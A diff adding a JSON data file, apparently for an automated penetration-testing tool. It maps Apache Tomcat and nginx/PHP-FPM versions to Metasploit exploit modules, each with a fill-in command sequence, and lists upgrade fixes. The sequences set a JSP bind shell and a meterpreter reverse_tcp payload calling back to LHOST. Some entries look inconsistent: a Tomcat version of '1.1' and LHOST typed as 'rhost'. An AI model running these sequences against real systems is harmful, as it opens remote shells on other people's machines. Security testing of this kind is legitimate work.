@@ -1,0 +1,77 @@
+[
+    {
+        "Service": "Apache Tomcat",
+        "Version": "1.1",
+        "metasploit": {
+            "path": "exploit/multi/http/tomcat_jsp_upload_bypass",
+            "doc": "https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/http/tomcat_jsp_upload_bypass.md",
+            "tutorial": {
+                "commands": [
+                    {
+                        "cmd": "set payload java/jsp_shell_bind_tcp",
+                        "type": ""
+                    },
+                    {
+                        "cmd": "set RHOST %s",
+                        "type": "rhost"
+                    },
+                    {
+                        "cmd": "set RPORT %d",
+                        "type": "rport"
+                    },
+                    {
+                        "cmd": "check",
+                        "type": "check"
+                    },
+                    {
+                        "cmd": "run",
+                        "type": "run"
+                    }
+                ]
+            }
+        },
+        "fix": "Upgrade to Apache Tomcat 7.0.82, 8.0.47, 8.5.23 or later."
+    },
+    {
+        "Service": "nginx",
+        "Version": "1.14.0",
+        "metasploit": {
+            "path": "exploit/multi/http/php_fpm_rce",
+            "doc": "https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/http/php_fpm_rce.md",
+            "tutorial": {
+                "commands": [
+                    {
+                        "cmd": "set PAYLOAD php/meterpreter/reverse_tcp",
+                        "type": ""
+                    },
+                    {
+                        "cmd": "set RHOSTS %s",
+                        "type": "rhost"
+                    },
+                    {
+                        "cmd": "set RPORT %d",
+                        "type": "rport"
+                    },
+                    {
+                        "cmd": "set LHOST %s",
+                        "type": "rhost"
+                    },
+                    {
+                        "cmd": "set TARGETURI /script.php",
+                        "type": ""
+                    },
+                    {
+                        "cmd": "check",
+                        "type": "check"
+                    },
+                    {
+                        "cmd": "run",
+                        "type": "run"
+                    }
+                ]
+            }
+        },
+
+        "fix": "Upgrade to nginx PHP-FPM 7.1.33, 7.2.24 or 7.3.11"
+    }
+]
